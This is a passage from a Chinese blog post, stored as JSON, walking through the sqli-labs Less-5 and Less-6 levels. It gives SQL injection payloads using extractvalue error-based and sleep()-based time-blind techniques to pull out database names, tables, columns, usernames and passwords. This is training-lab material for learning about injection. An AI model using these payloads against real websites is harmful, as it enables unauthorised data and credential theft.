class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>这里同样需要控制limit字段爆出信息</strong></p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203213330601.png\" alt=\"image-20220203213330601\"></p>\n<hr>\n<h3 id=\"extractvalue-：从目标XML中返回包含所查询值的字符串。\"><a href=\"#extractvalue-：从目标XML中返回包含所查询值的字符串。\" class=\"headerlink\" title=\"extractvalue()：从目标XML中返回包含所查询值的字符串。\"></a>extractvalue()：从目标XML中返回包含所查询值的字符串。</h3><p>　　EXTRACTVALUE (XML_document, XPath_string);</p>\n<p>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>\n<p>　　第二个参数：XPath_string (Xpath格式的字符串)</p>\n<p><strong>payloaod:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and extractvalue(0x7e,concat(0x7e,(select @version()),0x7e));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>extractvalue注入的原理：依旧如同<code>updatexml</code>一样，extract的第二个参数要求是<strong>xpath格式字符</strong>串，而我们<strong>输入的并不是</strong>。所以报错</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203214242168.png\" alt=\"image-20220203214242168\"></p>\n<p>后续过程如updatexml()相同。</p>\n<hr>\n<h2 id=\"0x01（时间盲注）\"><a href=\"#0x01（时间盲注）\" class=\"headerlink\" title=\"0x01（时间盲注）\"></a>0x01（时间盲注）</h2><p><strong>对于时间盲注，根据浏览器的反应，来猜测出数据库名，其实时间注入就是比布尔盲注多了一个<code>if函数</code>，<code>sleep()</code>函数就相当于布尔盲注中的<code>true或false</code>，其他语句大致都相同。</strong></p>\n<h3 id=\"sleep-函数\"><a href=\"#sleep-函数\" class=\"headerlink\" title=\"sleep()函数\"></a>sleep()函数</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;9,1,sleep(10)) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>if(condition,true,false)&#x2F;若条件为真 返回true，若条件为假 返回false</strong></p>\n<p>这里执行失败的话将睡10s。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203215718878.png\" alt=\"image-20220203215718878\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;6,1,sleep(5)) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>执行成功则会迅速返回结果。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203220032518.png\" alt=\"image-20220203220032518\"></p>\n<p>爆数据库名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆列名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))))&gt;100,1,sleep(10))--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆值：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&quot; and  if((ascii(substr(( select username from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>还是写个脚本跑一下方便啊！手工注效率低还容易出错啊！</p>\n<hr>\n<h3 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h3><p>第六关根据源码判断出，双引号报错：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;\n$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203221301023.png\" alt=\"image-20220203221301023\"></p>\n<p>这一关的注入方式和第五关相同，只需要将 <code>&#39;</code> 变为 <code>&quot;</code> 即可</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select 1,count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203222058885.png\" alt=\"image-20220203222058885\"></p>\n<p>后续过程同Less-5。</p>\n","text":"[TOC] 0x00Less-5和Less-6关看了很多文章，总的下来就是布尔盲注，报错注入和时间盲注，通过各种函数进行注入，在这里记录以下。 0x01（floor()报错）首先，开始注入的时候先是按照1-4关的注入方式探测了以下注入点，又看了一下源码，发现源码当中只能输出You...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"靶场","slug":"靶场","count":12,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88floor-%E6%8A%A5%E9%94%99%EF%BC%89\"><span class=\"toc-text\">0x01（floor()报错）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%B8%83%E5%B0%94%EF%BC%89\"><span class=\"toc-text\">0x01（无回显的布尔）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-1\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-1\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-1\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06-1\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88XPATH%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%EF%BC%89\"><span class=\"toc-text\">0x01（XPATH函数报错）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-2\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-2\"><span class=\"toc-text\">0x03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#extractvalue-%EF%BC%9A%E4%BB%8E%E7%9B%AE%E6%A0%87XML%E4%B8%AD%E8%BF%94%E5%9B%9E%E5%8C%85%E5%90%AB%E6%89%80%E6%9F%A5%E8%AF%A2%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82\"><span class=\"toc-text\">extractvalue()：从目标XML中返回包含所查询值的字符串。</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01%EF%BC%88%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89\"><span class=\"toc-text\">0x01（时间盲注）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sleep-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">sleep()函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Less-6\"><span class=\"toc-text\">Less-6</span></a></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入-Less8-Less10","uid":"7e9ef5437654636a3aa94a45e71b7622","slug":"SQL注入-Less8-Less10","date":"2022-02-03T16:35:17.000Z","updated":"2022-02-13T15:42:39.833Z","comments":true,"path":"api/articles/SQL注入-Less8-Less10.json","keywords":null,"cover":[],"text":"[TOC] 0x00记录一下Less-8—Less10盲注遇到的一些问题 0x01首先8-10关最大特点就是没有报错回显，导致开始注入的时候都是利用报错注入，结果统统失败，后来查看源码发现，报错回显被注释掉了，那这几关报错盲注就不能用了，只能用布尔盲注和时间盲注。 0x02其次就...","link":"","photos":[],"count_time":{"symbolsCount":746,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"靶场","slug":"靶场","count":12,"path":"api/tags/靶场.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入-盲注","uid":"db9d897023f4869df00e643d24440891","slug":"SQL注入-盲注","date":"2022-02-02T07:08:10.000Z","updated":"2022-02-11T13:18:49.307Z","comments":true,"path":"api/articles/SQL注入-盲注.json","keywords":null,"cover":[],"text":"SQL盲注概述盲注，通俗易懂一点，就是在页面没有提供明显信息的情况执行的注入方式。 1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的 盲注来获取信息。2.盲注是不能通过直接显示的途径来获取数据库数据的方法。 盲注的分类1、布尔盲注 2、...","link":"","photos":[],"count_time":{"symbolsCount":"3.2k","symbolsTime":"3 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}